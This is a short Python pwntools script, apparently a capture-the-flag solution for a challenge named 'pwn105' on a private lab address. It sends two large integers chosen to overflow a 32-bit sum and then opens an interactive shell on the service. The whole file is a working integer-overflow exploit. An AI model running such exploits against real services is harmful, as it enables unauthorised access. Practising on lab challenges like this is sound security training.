from pwn import *

a = 1879048192
b = 536870912

try:
    # Attempt to connect to the remote host
    target = remote('10.10.148.24', 9005)
    #target = process('./pwn105')
    target.recvuntil(']>> ')
    target.sendline(str(b))
    target.recvuntil(']>> ')
    target.sendline(str(a))

    target.interactive()
except PwnlibException as e:
    print(f"Connection failed: {e}")
